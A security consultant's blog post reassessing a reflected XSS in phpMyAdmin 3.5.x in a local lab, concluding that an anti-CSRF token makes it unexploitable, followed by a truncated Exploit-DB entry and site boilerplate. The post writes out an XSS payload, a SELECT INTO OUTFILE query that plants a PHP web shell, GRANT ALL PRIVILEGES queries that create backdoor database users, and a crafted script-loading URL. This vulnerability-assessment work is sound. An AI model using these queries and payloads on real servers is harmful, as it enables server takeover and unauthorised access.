### PHPMyAdmin 3.5.X-3.5.8 Reflected XSS: What could have been, but really wasn't.

(This blog post is from Leff (Lautaro Fain), one of our consultants, and I asked him to do a special project, as documented below.)

### 1. Introduction

A few days ago Dave asked me to take advantage of a known vuln affecting **PHPMyAdmin MySQL Management Platforms (Versions 3.5.X to 3.5.8)** in order to gain a Web Shell or Admin Rights Access to the server. It was nothing more than a common Reflected Cross-Site Scripting issue taking place in an âin attributeâ context. The vuln is conveniently described in the links below:

<https://www.first.org/cvss/examples#1-phpMyAdmin-Reflected-Cross-site-Scripting-Vulnerability-CVE-2013-1937>

<https://www.exploit-db.com/exploits/38440>

This is the theoretical severity scoring from the team at FIRST:

![](https://lh4.googleusercontent.com/2JfzkticHsyLQzenl2D4-M5xMd3m_8ebWwoYCbwNlI-ytkpPt8pD1aq6Rmse_oHD5tijNJGXYTGUt9e-LppKoLmOs7vDyFHUOdz0Zr6X9Gr-Bt7f8Z6GE3hKkAlsCT_d_SSFvv9z)
[![](https://lh3.googleusercontent.com/nIEsazQyR5hGs6tPCXXRY4ysGg4pSUyCoIPtF1P2hbXaEMmDRBkJ-eYza3BLlnFhK5yPpQFYTD94fv2gsQeMBTi65OWtl-gdW462CRPRCgXvnMTirdGHitVBRHTk__dMGowbAv7U)](https://lh3.googleusercontent.com/nIEsazQyR5hGs6tPCXXRY4ysGg4pSUyCoIPtF1P2hbXaEMmDRBkJ-eYza3BLlnFhK5yPpQFYTD94fv2gsQeMBTi65OWtl-gdW462CRPRCgXvnMTirdGHitVBRHTk__dMGowbAv7U)

This document enumerates the ways I tried to exploit this issue, and provides a more accurate ranking of the vulnerabilityâs technical risk.

### 2. Exploitation Phase

#### Taking a closer look at the issue...

![](https://lh4.googleusercontent.com/3mrhNYXUD-mLW0qVec5w1kF3Jye05i5zrU3IwybGE4UFmuLyhH4ANe5VKf3J1Dxauq9k-GOsTUoi0EBgFXksqgTypHwWA99PtK0j7k5X1Xr7WA-CzQEx97FooLcTJFkVeBKg4Y9U)

As soon as the task was given, I grabbed a vulnerable PHPMyAdmin version (this being 3.5.1, <https://www.phpmyadmin.net/files/>) and began the installation process in order to make a local lab to test the issue.

Once the âserverâ was running smoothly (fixed some issues and then ran âphp -S localhost:8085â in a terminal), I decided to take a look at the vulnerable files to see by eye if the issue was present.

![](https://lh6.googleusercontent.com/xjUqWaTbKQiBEjanZKwutkPGZ50gXv6O0iZHYQUKHtvpuItPj4h8f_tpSKMO-X1_fAmC1tPcgwdCgPRYuWzR-Fd6XUZlRpci7iUdpUsLV8tmIcEpOSy32czoMB_irUQtrsoG_kcl)

After reaching the âtbl\_gis\_visualization.phpâ file and reading the code, we get to infer that âvisualizationSettings[âwidthâ]â and âvirtualizationSettings[âheightâ]â parameters are indeed our entrypoint to exploit this vulnerability as they get rendered back in the HTML code without taking any kind of sanitization process.

![](https://lh6.googleusercontent.com/keGDpio5pNwQAfy9fePBHKZC6Prx1za4fOkYOND2bnB9ekuqW5GVBOVfqP2ZlSeDZX-D_vYPSrHAQpxD4YaUZFp-9gxd23khNtJyxwtA7rEaDq85Datt_xQuhBoweJl2m_t2ZWrW)

To keep going forward, we would need to test if the statement provided above is correct and then try to exploit this issue with our bare hands. To first confirm that we are right, a simple XSS Payload (***â><script>alert(âImmunity INC.â)</script>***) was provided and executed within the context of an already logged in user (ârootâ in this case).

![](https://lh4.googleusercontent.com/COXUntZ4hbbzqmrC9YhkyabgK7M19ghiBbCDZ644bKDt6fmzJ_E4OC39IeykxDrEKAOkEG6seJ8P6SK1LxR1ERZ8j2MOmmHLXl0yAjuywY0Lcc1PyBVu8jGMkFyAe1cSdERF83hH)

#### Analyzing possible attack vectors

It worked as expected - we are for sure facing an âIn Attributeâ Cross-Site Scripting vulnerability. Now, let's check if we can make some malicious things out of that. For further understanding, let me explain the two most common techniques that are used to take over PHPMyAdmin or MySQL Servers.

a) The âSELECT INTO OUTFILEâ technique: So, by its very own nature, PHPMyAdmin gives us the chance to execute SQL Queries through a web interface and, as our objective would be creating a new PHP file that works as Web Shell, this is almost a win-win situation for us. We go straight to the objective and run the necessary queries to check if indeed this can be done from here (âSELECT "<?php system($\_GET['cmd'])?>" INTO OUTFILE "/imm\_shell.php";â) but well, it's not that easy.

![](https://lh4.googleusercontent.com/WXonlX32uDHmNkb611dBanQMhovRuEwvXv1ooOJWziU2CReiU4LWUf7iBd2I0p9gyiVWrDz8TcaqQvphuMOPSw7je7dstiHvZ0h7vG_GKJkG_ps2Wm7D_Hfgl-6GzjIgWLRH-6w0)

MySQL Servers have this tiny global variable called âsecure\_file\_privsâ which is used to specify which directories the client can write on. Let's take a look at it by using: âSELECT @secure\_file\_privs;â.

HA! Canât get surprised anymore, this variable is set to âNULLâ by default and in real case scenarios, the database admin will set it to allow writing in directories that are NOT exposed to the outside world (like â/tmpâ or â/custom\_dirâ instead of using â/var/wwwâ to create temporary files or storing persistent files). Anyways, as we all know, there can still be some cases where this variable allows MySQL file writing in root web server directories (yes, I'm mentioning â/var/wwwâ again as an example) that can be accessed through the browser which means that this technique (if possible to achieve) will get us an immediate web shell!

But sadly, this is not the case for us, and as this variable cannot be set through PHPMyAdmin (it needs to be changed from the âmy.iniâ file within the MySQL folder) queries or configuration environments, we can't bypass this.

b) Creating a New Privileged User through SQL Queries: This is another possible attack vector, we can execute the queries needed to create a new user in the database, this user would need to have enough privileges to do the same things as the ârootâ or âadminâ user usually does. Sounds good, let's make it happen (using this query âGRANT ALL PRIVILEGES ON \*.\* TO 'immtest'@'localhost' IDENTIFIED BY 'immtest';â):

![](https://lh6.googleusercontent.com/-FdLkIwj1nUdTMihGSyU6a3g7SRfZ6_DSxSSDkEdkP2rKPJEozF3gwh8JhkmARcJgvKYCYigL2K0uwF1USIanS5eiLAQ1DT5H9oy84eW_0CJtRGlC-dWkrKusjSWMSmd52jAWPgE)

Letâs log in with this new credentials, they might work as expected.

![](https://lh3.googleusercontent.com/AO1kMd-kxUAmgv7HdwUenapnPl-10qhXQkalyMD8F2J0c83v-9AIy4y-G2bG1f1JKO0ILiCIxODBk3vFTTBZ0RBke6Z1KzRJERdwBGEKkrB5ue6mhmZFDINP_0sC7uNl6zWCVYo8)

![](https://lh6.googleusercontent.com/uIL8RqkIt_DxTHUVSJyopOwGCpYAFMORXbHh-zXf50ycAy7vqnqTWEuihBrlGuZoN_JwO8G2ujIymu7E2lz-Izn56HbtcgzUhuQ0WOqLCYZGxE41hyXjAm3C9Y5pxJ8-UF0Ewck3)

Awesome, they do work and have all the possible privileges! But wait, do you remember that we created this user while logged in with the ârootâ user credentials, right? Not cool - what if during a real case scenario we manage to find credentials that belong to a less privileged user, can we still make this happen? Let's check this with another user, we will create it as a default user and then create a new user with that account.

[![](https://lh4.googleusercontent.com/PoGK70ZCQhJcduqY3S7nRnqwn7NGq4Q7dAPHCa01RrY8rThIrpzze2JM_tag9qIUOS3MSrxUqhtA2jsQX6QRrV1XLuUlrBynSKJ3ezveG3qItvTiws7Aur8rTHRS6ILFHQC1KjQ-)](https://lh4.googleusercontent.com/PoGK70ZCQhJcduqY3S7nRnqwn7NGq4Q7dAPHCa01RrY8rThIrpzze2JM_tag9qIUOS3MSrxUqhtA2jsQX6QRrV1XLuUlrBynSKJ3ezveG3qItvTiws7Aur8rTHRS6ILFHQC1KjQ-)

[![](https://lh3.googleusercontent.com/ViYS1AR7IosqRW4QN3AYGl__4RbGmfbK8xVNDARTHACGpT_01fvgPXI-ta0h7cYVDQNcppNQGiowNtih7oOGoN-5EOl-I2PILww64CCm2vNZvfSrxFvz5ay6-vXRiRgl3_NEClEf)](https://lh3.googleusercontent.com/ViYS1AR7IosqRW4QN3AYGl__4RbGmfbK8xVNDARTHACGpT_01fvgPXI-ta0h7cYVDQNcppNQGiowNtih7oOGoN-5EOl-I2PILww64CCm2vNZvfSrxFvz5ay6-vXRiRgl3_NEClEf)

New user created, as you may have seen, he cannot see anything apart from the classic system tables. Let's suppose we have grabbed his credentials and we want to create a new user, but this time with this âimmtest\_noprivâ account.

![](https://lh6.googleusercontent.com/gYBIBVNEFO0EjzyOx_u9Qx8FwLxg5XV0-H_9ubqgpgDquht0EorqNZuyDpls2AwBJ2_tHcWHuEwarZnA0qHc9Pg5CcvH7R_WiFp_hquuBRgi8xsGOpi6AG__vLCLlsWEHUjIYJtK)

Okay, not surprised again. What is happening here? We cannot create a new user having all the privileges from an account that doesn't have enough privileges to do so, this means, that if the credentials we grabbed are not supposed to create users with the greatest possible privileges (that is set by the database admin) we won't be able to create an user which can do anything else than reading system tables or even, we won't neither be able to create a new user.

So, where do we stand here? Well, we can still make use of our XSS issue to execute queries inside PHPMyAdmin - so letâs create a payload to make that happen!

#### Creating our payload

For length reasons, this payload will need to be created as a single Javascript file and be served in a malicious server so we can retrieve it when trying to exploit our vulnerability.

To begin, as always, we grab the POST request made from the client side to the server using Burp so we can check the sent parameters and values to replicate that in our code.

![](https://lh5.googleusercontent.com/BntqSoc9GZdTdHFc6A4wqpYxFZ3Trpfy5AVdTboh9BTBVpvxWim0uv_3sEVehzk44-kp4doLO1vIiMVX7HMtTzRnR_4OS6OAHxqM8kTluQGBcQhhk7Yg-5UbkZkpMVpbB8d8mvdw)

We modified the âsql\_queryâ with some SQL Instructions (that being âGRANT ALL PRIVILEGES ON \*.\* TO 'xssuser'@'localhost' IDENTIFIED BY 'xssuser';â) parameter to check if everything runs smoothly and we can indeed send whatever query we want to the server side.

![](https://lh5.googleusercontent.com/ilu-MOo-y-BH0jGT7w_TVgF_hTourRkDBvP7ybKjMtLl4KquBq1kXk5YOil26f23OgFNPR4Q1Go9156fgVsCdQ_Q497VcJGQBFEgcGEN6hHtBDc-yDdcjUCEFFD0A3kb5DNHMPxZ)

Awesome, the user we created now exists, this means that all works as expected. Letâs dive into the Javascript code creation.

![](https://lh6.googleusercontent.com/pqJvtqPqrudLII3NpHl2fN7kC8TmzPV5e8wiFMy-uBZIAbKn2BE7b5AOPnNVNoCKowViVYqQDp6dlxyaXwEUwLaeJB6ZsFMESi2XLD7BYgU6ownPdOOcjE-29An5xsa1Yxd64Lat)

Some explanation might come in handy, so i will enumerate some of the payload behaviour below:

1. We need to grab the victimâs token before doing any request, it works as a âcsrfâ and sort of session token as once (despite PHPMyAdmin also using the widely known âphpMyAdminâ cookie). That's what the first line does, we dynamically retrieve that from a hidden input in the vulnerable web page using javascript.
2. The desired query to execute is specified on the second line.
3. We replicated the HTTP POST RequestÂ  body, so the server gets what it expects and nothing more than that (third line).
4. The target endpoint is set at the sixth line.
5. And finally, we use JavaScript built in âfetchâ function to make an HTTP POST request that bypasses CORS and then sends another GET request to our malicious server specifying the response status as an endpoint.

As you might expected, this is not a difficult thing to do. We can now exploit this vulnerability referencing our malicious code.

#### Yay! Time to exploit this thing!

We change the âsql\_queryâ parameter to hold whatever we want to, this time, i will create another user called âleff\_exploit\_testâ to check that it works.

![](https://lh4.googleusercontent.com/yEeX7kQ0pdKa8WdMaV5nM8a-uTWT6rRy5uFKXrj0tGMr6n6PqfhEslUwfc7WvTFVaE4ZlmB9OE2MzQ1NMjio9rjimCkUl2WcQmamqwX0cYum8Eqm9R-Uyg7-Qyk1mGsewSGNxVer)

After hosting the file in our malicious server, and exploiting the scenario (we got 200 as a HTTP Status!) we can test if the user was indeed created.

![](https://lh3.googleusercontent.com/wtiLbnOIuFbBXU9-dLsJh9al30vzSDAdYx6_4lT8tL3nwbImDYiVgTCVM9Sgwab-RuX-1qoSNpmmKMgaZ8lH4JfasDRGqBPnZKRKOmu69T-7n1T_kotEJTNHM77ooUGTwMSyRhez)

Awesome, this worked! This is a Reflected XSS Vulnerability, we will use this to make victims execute arbitrary Javascript code within their browser when clicking a specially crafted link. Letâs try that!

### 3. Showstopper realizations

Time to reach the finish line, this link will be the one that triggers the exploit we made:

**http://localhost:8085/tbl\_gis\_visualization.php?db=information\_schema&token=550a80691c075e6b4a4e0c9f410a1db4&visualizationSettings[width]=%22%3E%3Cscript%20src=%22http://localhost:5555/test.js%22%3E%3C/script%3E**

But wait, did you notice something? The *token* value also travels in the GET request. THATâS NOT GOOD! We cannot exploit that, since that that token belongs to the user himself and thereâs no way we can retrieve it before crafting the malicious url (at least in the position we are now). We can try some things to see if the server does not enforce proper checks to that attribute. Can we send requests to the server without providing the correct token or not providing a token at all? Common tests involve:

1. Sending an empty token parameter.
2. Sending a badly crafted token parameter.
3. Not sending the token parameter.
4. Sending the token parameter as an array type parameter (Just for PHP Servers).
5. Sending the token parameter holding a null value.

After trying all of these options none of them seemed to work as our malicious server didnât get involved in any request. It was still immutable since the first time we exploited the issue.

![](https://lh3.googleusercontent.com/8pf8gHluH2z1GF7__PVLR2r-pWDM6B5zurFMNMSH7wW3wD3vmu6qJsBr3Gmx82xLzUsPG8AS7GFdbAriy2GUCZfY2elYfQTUcHFr34qDYSdW2rY-IlKalcQA8ckR8KSFe5j4gijN)

There is still one more thing to check - is this token predictable? If so, we might still have a chance to abuse this issue, lets search the code that generates this attribute value. Following its trail led us to the âurl\_generating.lib.phpâ file, seems that the actual token value is being retrieved from the session object, and so on, created there.

![](https://lh3.googleusercontent.com/Jqs-FbHGygqLy1zQsAvccXmvzwRJMm_yAK3FmiCYp62b-AbxHO2l8jYQ9rYT9igJW07RAdiyH5fB5cs1_sry8ENBxclcfedSPkq0l40KnhXSO-m4CszpsXWyXWsVK9S9CQ2YrfP1)

We need to search for âPMA\_tokenâ instead of the âtokenâ word now.

![](https://lh6.googleusercontent.com/K_DOc-neHl8gHHgch__BgMGuN3D35ssu-hPcPomxynB23qWRRcdd3xNYe4v4GpSPDB3bPbOGiOjZfgz2csqyHuwQHwNv5R9Qy3M-5kne2SF2lD-nZKhzilMX0pDiJKA7wBPR658W)

So, we found this again, but if you look carefully, the token is crafted in the following way:

1. **rand()** is called with no fixed or predictable value as an input, which discards any kind of prediction to know what value can be retrieved from that function call. When called that way, rand() returns a pseudo-random integer between 0 and getrandmax().
2. The output of that call is passed as an input to uniqid() along with âtrueâ which means that an unique ID will be generated with a length of 23 characters instead of 13, adding even more entropy to the result.
3. That output is the input of a MD5 hash function and that would be the last value that is assigned to the token
4. On Windows platforms, there is some discussion of the value of uniqid being predictable to a âsecondâ of resolution, but this does not seem likely to be fruitful with our particular code-path (which has more\_entropy=true)

Finally, we can infer this token works as an Anti-CSRF one, and prevents us from crafting malicious links that when clicked will make victims execute our desired MySQL queries on their server.

### 4. Conclusion

As we seen above, this vulnerability cannot be exploited in the wild as we would need to first predict in some way the necessary token to perform those requests. We will need to reassign a proper CVSS (v2 & v3) Score to each of the cases we have here, being them:

1. We have the possibility to predict the needed token.
2. We cannot predict the needed token.

So, before going into that phase, letâs analyze each score metric for each vulnerability case:

**CASE A**

I will walk you through âCase Aâ first, a scenario were we can (by some sort of way) predict the token that is needed to perform requests to execute arbitrary MySQL queries in the backend server. For the score calculation we will keep in mind the worst case scenario (or the best for the attacker) which involves a not properly configured backend database and an user who has enough privileges to execute and do whatever he wants there.

As queries can be sent by triggering the XSS, the old âSELECT INTO OUTFILEâ technique can also be used to compromise the server with a shell and the attacker will be able to read whatever he wants, dump whatever he wants and modify the integrity of what he wants thus affecting directly the Confidentiality, Integrity and Availability of the whole service. All of this will be triggered after the user clicks the pre-crafted malicious link that the attacker provided. Keep in mind that the potential impact on the database is what increases the severity of the issue itself and that the victim user needs to be logged in when clicking the link (as with any XSS).

CVSS v2.0 (Predictable token);

Overall CVSS Score: **5.6** (AV:N/AC:H/Au:S/C:C/I:C/A:C/E:POC/RL:OF/RC:C)

CVSS v3.0 (Predictable token);

Overall CVSS Score: **8.0** (High) (AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H/E:P/RL:O/RC:C)

**CASE B**

In âCase Bâ, which is the most realistic one, this issue cannot be used to target another user. In the actual conditions this is just a Self-XSS (also known as ânot a vulnerabilityâ or CVSS v3.0 score of 0) because we cannot predict the token of the victim user to then use it for the malicious URL crafting process, we can only get access to our token to trigger the vulnerability only in our side once we have already logged in. This bug is not exploitable within the described context. Itâs worth noting that at no point does HTTPOnly on the cookie come into our analysis, as mentioned in the [original FIRST.org analysis](https://www.first.org/cvss/examples#1-phpMyAdmin-Reflected-Cross-site-Scripting-Vulnerability-CVE-2013-1937).

# phpMyAdmin - 'tbl\_gis\_visualization.php' Multiple Cross-Site Scripting Vulnerabilities

#### EDB-ID:

###### 38440

#### CVE:

###### [2013-1937](https://nvd.nist.gov/vuln/detail/CVE-2013-1937)

---

**EDB Verified:**

#### Author:

###### [waraxe](/?author=973)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2013-04-09

---

**Vulnerable App:**

```
source: https://www.securityfocus.com/bid/58962/info

phpMyAdmin is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.

An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

phpMyAdmin 3.5.0 through versions 3.5.7 are vulnerable.

##### About The Exploit Database

Ã

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as âGoogle Hackingâ was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnnyâs talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term âGoogledorkâ to refer
to âa foolish or inept person as revealed by Googleâ. This was meant to draw attention to
the fact that this was not a âGoogle problemâ but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term âdorkâ became shorthand for a search query that located sensitive
information and âdorksâ were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
